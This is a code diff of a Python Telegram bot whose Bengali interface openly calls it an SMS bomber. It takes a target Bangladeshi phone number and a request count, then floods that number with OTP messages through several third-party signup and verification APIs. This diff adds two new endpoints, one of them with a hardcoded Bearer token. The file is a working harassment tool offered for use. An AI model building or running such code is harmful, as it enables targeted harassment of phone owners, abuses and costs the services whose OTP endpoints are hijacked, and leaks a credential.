@@ -31,6 +31,27 @@ HISTORY_FILE = Path("history.json")
 CONCURRENCY = 150
 WAKEUP_URL = os.getenv("WAKEUP_URL", "https://rk-syatem.onrender.com")
 
+# ---------------- EXTRA APIS ----------------
+EXTRA_APIS = [
+    {
+        "url": "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",
+        "headers": {
+            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q",
+            "Content-Type": "application/json",
+        },
+        "payload": lambda number: {"phone": f"88{number}"}
+    },
+    {
+        "url": "https://api.ilyn.global/auth/signup-account-verification",
+        "headers": {
+            "appId": "1",
+            "appCode": "ilyn-bd",
+            "Content-Type": "multipart/form-data",
+        },
+        "payload": lambda number: f'------WebKitFormBoundary1MwG6OYBsBAmXqyx\r\nContent-Disposition: form-data; name="recaptchaToken"\r\n\r\nTOKEN_HERE\r\n------WebKitFormBoundary1MwG6OYBsBAmXqyx\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{{"code":"BD","number":"{number}"}}\r\n------WebKitFormBoundary1MwG6OYBsBAmXqyx\r\nContent-Disposition: form-data; name="provider"\r\n\r\nsms\r\n------WebKitFormBoundary1MwG6OYBsBAmXqyx--'
+    }
+]
+
 # ------------- HELPERS ------------------
 def load_history():
     if HISTORY_FILE.exists():
@@ -40,46 +61,38 @@ def load_history():
             return {}
     return {}
 
-
 def save_history(data):
     HISTORY_FILE.write_text(json.dumps(data, indent=2))
 
-
 history = load_history()
 running_jobs = {}  # chat_id -> list of jobs
-
+pending_numbers = {}  # chat_id -> number (waiting for amount)
 
 # ------------- FASTAPI ------------------
 app = FastAPI()
-
 
 @app.get("/", response_class=HTMLResponse)
 async def home():
     return HTMLResponse("<h3>Bot running successfully 🚀</h3>")
 
-
 @app.get("/health")
 async def health():
     return JSONResponse({"status": "ok"})
 
-
-# ------------- MEMORY CLEANUP SYSTEM ------------------
+# ------------- MEMORY CLEANUP ------------------
 async def memory_cleanup():
-    """Automatically free memory if usage exceeds limit, without stopping jobs"""
     process = psutil.Process(os.getpid())
     while True:
         try:
-            mem_usage = process.memory_info().rss / 1024 / 1024  # in MB
+            mem_usage = process.memory_info().rss / 1024 / 1024
             if mem_usage > 450:
                 print(f"⚠️ Memory high ({mem_usage:.2f} MB). Running cleanup...")
-                gc.collect()  # safely clean unused memory
+                gc.collect()
                 await asyncio.sleep(3)
             await asyncio.sleep(10)
         except Exception as e:
             print(f"[MemoryCleanup Error] {e}")
             await asyncio.sleep(10)
-# ------------------------------------------------------
-
 
 # ------------- REQUEST SENDER ------------------
 class RequestStats:
@@ -88,37 +101,39 @@ class RequestStats:
         self.dismiss = 0
         self.total = 0
 
-
-async def send_requests(number: str, stop_event: asyncio.Event, stats: RequestStats):
+async def send_requests(number: str, stop_event: asyncio.Event, stats: RequestStats, amount: int):
     sem = asyncio.Semaphore(CONCURRENCY)
     timeout = aiohttp.ClientTimeout(total=10)
 
     async with aiohttp.ClientSession(timeout=timeout) as session:
-        async def fire_once():
-            payload = {"msisdn": number}
+        async def fire_api(url, headers, payload):
             async with sem:
                 try:
-                    async with session.post(API_URL, json=payload, headers=HEADERS) as r:
+                    async with session.post(url, json=payload if isinstance(payload, dict) else None, data=payload if isinstance(payload, str) else None, headers=headers) as r:
                         text = await r.text()
                         stats.total += 1
-                        if '"status":"SUCCESSFUL"' in text:
+                        if '"status":"SUCCESSFUL"' in text or '"success":true' in text:
                             stats.success += 1
                         else:
                             stats.dismiss += 1
                 except Exception:
                     stats.dismiss += 1
 
-        while not stop_event.is_set():
-            tasks = [asyncio.create_task(fire_once()) for _ in range(10)]
-            await asyncio.gather(*tasks, return_exceptions=True)
+        for _ in range(amount):
+            if stop_event.is_set():
+                break
+            # Main API
+            await fire_api(API_URL, HEADERS, {"msisdn": number})
+            # Extra APIs
+            for api in EXTRA_APIS:
+                payload = api["payload"](number)
+                await fire_api(api["url"], api["headers"], payload)
             await asyncio.sleep(0.1)
-
 
 # ------------- TELEGRAM BOT ------------------
 async def start(update, context: ContextTypes.DEFAULT_TYPE):
     kb = ReplyKeyboardMarkup([[KeyboardButton("এসএমএস বোম্বার")]], resize_keyboard=True)
     await update.message.reply_text("স্বাগতম! এসএমএস বোম্বিং করতে নিচের বাটনে চাপুন 👇", reply_markup=kb)
-
 
 async def mini_button(update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
@@ -128,17 +143,33 @@ async def mini_button(update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("টার্গেট নাম্বার দিন📱")
         return
 
+    if chat_id in pending_numbers:
+        number = pending_numbers.pop(chat_id)
+        if text.isdigit():
+            amount = int(text)
+            if 5 <= amount <= 500:
+                ikb = InlineKeyboardMarkup.from_button(
+                    InlineKeyboardButton("Start", callback_data=f"start|{number}|{amount}")
+                )
+                await update.message.reply_text(
+                    f"নম্বর: {number}\nপরিমাণ: {amount}\n\nনিচে Start চাপলে বোম্বিং শুরু হবে 🚀",
+                    reply_markup=ikb
+                )
+                return
+            else:
+                await update.message.reply_text("⚠️ পরিমাণ 5 থেকে 500 এর মধ্যে দিন। আবার চেষ্টা করুন।")
+                pending_numbers[chat_id] = number
+                return
+        else:
+            await update.message.reply_text("❌ শুধু সংখ্যা লিখুন (5 থেকে 500)।")
+            pending_numbers[chat_id] = number
+            return
+
     if re.fullmatch(r"01\d{9}", text):
-        ikb = InlineKeyboardMarkup.from_button(
-            InlineKeyboardButton("Start", callback_data=f"start|{text}")
-        )
-        await update.message.reply_text(
-            f"নম্বর: {text}\nনিচে Start চাপলে বোম্বিং শুরু হবে 🚀",
-            reply_markup=ikb
-        )
+        pending_numbers[chat_id] = text
+        await update.message.reply_text("✅ টার্গেট নাম্বার সঠিক!\nএখন কতটি রিকোয়েস্ট পাঠাতে চান লিখুন (5–500):")
     else:
         await update.message.reply_text("❌ নম্বর সঠিক নয়! 01XXXXXXXXX ফরম্যাটে দিন।")
-
 
 async def callback_handler(update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -147,12 +178,13 @@ async def callback_handler(update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data
 
     if data.startswith("start|"):
-        number = data.split("|", 1)[1]
+        parts = data.split("|")
+        number = parts[1]
+        amount = int(parts[2]) if len(parts) > 2 else 10
 
         if chat_id not in running_jobs:
             running_jobs[chat_id] = []
 
-        # সীমা: একসাথে সর্বাধিক 5টি নম্বর চালু হতে পারবে
         if len(running_jobs[chat_id]) >= 5:
             await query.message.reply_text("⚠️ সর্বাধিক 5টি নম্বর একই সাথে চালু হতে পারে। আগে কিছু Stop করুন।")
             return
@@ -163,17 +195,17 @@ async def callback_handler(update, context: ContextTypes.DEFAULT_TYPE):
 
         stop_event = asyncio.Event()
         stats = RequestStats()
-        task = asyncio.create_task(send_requests(number, stop_event, stats))
+        task = asyncio.create_task(send_requests(number, stop_event, stats, amount))
         running_jobs[chat_id].append({
             "number": number,
             "task": task,
             "stop_event": stop_event,
-            "stats": stats
+            "stats": stats,
+            "amount": amount
         })
         await query.message.reply_text(
-            f"✅ এই নম্বরে {number} বোম্বিং শুরু হয়েছে।\n👉 বন্ধ করতে /stop {number}\n👉 চেক করতে /check"
+            f"✅ এই নম্বরে {number} বোম্বিং শুরু হয়েছে।\n📦 মোট রিকোয়েস্ট: {amount}\n👉 বন্ধ করতে /stop {number}\n👉 চেক করতে /check"
         )
-
 
 async def stop(update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = str(update.effective_chat.id)
@@ -198,9 +230,8 @@ async def stop(update, context: ContextTypes.DEFAULT_TYPE):
     job["stop_event"].set()
     stats = job["stats"]
     await update.message.reply_text(
-        f"🛑 Bombing Stopped!\nNUMBER: {job['number']}\n✅ Successful: {stats.success}\n❌ Dismiss: {stats.dismiss}\n📊 Total: {stats.total}"
+        f"🛑 Bombing Stopped!\nNUMBER: {job['number']}\n✅ Successful: {stats.success}\n❌ Dismiss: {stats.dismiss}\n📊 Total: {stats.total}\n📦 Planned: {job.get('amount', 'N/A')}"
     )
-
 
 async def check(update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = str(update.effective_chat.id)
@@ -213,10 +244,9 @@ async def check(update, context: ContextTypes.DEFAULT_TYPE):
     for job in running_jobs[chat_id]:
         stats = job["stats"]
         text_lines.append(
-            f"নম্বর: {job['number']}\n✅ Success: {stats.success}\n❌ Dismiss: {stats.dismiss}\n📊 Total: {stats.total}"
+            f"নম্বর: {job['number']}\n📦 Planned: {job.get('amount', 'N/A')}\n✅ Success: {stats.success}\n❌ Dismiss: {stats.dismiss}\n📊 Total: {stats.total}"
         )
     await update.message.reply_text("📡 Live STATS:\n\n" + "\n\n".join(text_lines))
-
 
 async def history_command(update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = str(update.effective_chat.id)
@@ -226,7 +256,6 @@ async def history_command(update, context: ContextTypes.DEFAULT_TYPE):
         return
     text = "\n".join(user_hist[-5:])
     await update.message.reply_text(f"Last 5 History:\n{text}")
-
 
 # ------------- TELEGRAM LOOP ------------------
 async def telegram_bot():
@@ -247,7 +276,6 @@ async def telegram_bot():
     while True:
         await asyncio.sleep(3600)
 
-
 # ------------- AUTO WAKEUP SYSTEM ------------------
 async def keep_alive():
     while True:
@@ -257,19 +285,17 @@ async def keep_alive():
                     print(f"[AutoWakeup] Ping {r.status}")
         except Exception as e:
             print(f"[AutoWakeup Error] {e}")
-        await asyncio.sleep(600)  # প্রতি 10 মিনিটে একবার
-
+        await asyncio.sleep(600)
 
 # ------------- FASTAPI STARTUP ------------------
 @app.on_event("startup")
 async def startup():
     asyncio.create_task(telegram_bot())
     asyncio.create_task(keep_alive())
-    asyncio.create_task(memory_cleanup())  # ✅ Memory auto-cleanup system
+    asyncio.create_task(memory_cleanup())
     print("RK-SYSTEM Server is started successfully!")
-
 
 # ------------- RUN LOCALLY ------------------
 if __name__ == "__main__":
     import uvicorn
-    uvicorn.run("rksystem:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
+    uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
